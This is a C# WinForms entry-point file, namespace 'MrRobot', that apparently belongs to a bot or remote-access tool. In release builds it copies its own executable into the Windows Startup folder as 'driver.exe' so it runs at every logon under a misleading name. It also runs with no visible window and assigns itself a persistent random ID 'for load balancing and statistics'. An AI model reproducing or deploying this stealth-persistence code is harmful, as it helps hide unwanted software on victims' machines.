using System;
using System.Threading;
using System.Windows.Forms;

namespace MrRobot
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
#if DEBUG

            Application.Run(new Form1());
#else
            //Copy app to startup 
            var StartupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\driver.exe";
            if (Application.ExecutablePath != StartupPath)
            {
                var thread = new Thread(new ParameterizedThreadStart(MyT));
                thread.Start(StartupPath);
                //System.Diagnostics.Process.Start(StartupPath);
                //var form = new Form1();
            }
            else
            {
                var form = new Form1();
                //Generate Random Id for load balancing and statistics
                try
                {
                    var id = Properties.Settings.Default.Id;
                }
                catch
                {
                    Properties.Settings.Default.Id = Guid.NewGuid();
                    Properties.Settings.Default.No = (byte)new Random().Next(0, 99);
                    Console.WriteLine(Properties.Settings.Default.No);
                    Properties.Settings.Default.Save();
                }

                Application.Run();
            }

#endif
        }
        static void MyT(object arg)
        {
            System.IO.File.Copy(Application.ExecutablePath, arg.ToString(), true);
            System.Diagnostics.Process.Start(arg.ToString());
        }
    }
}
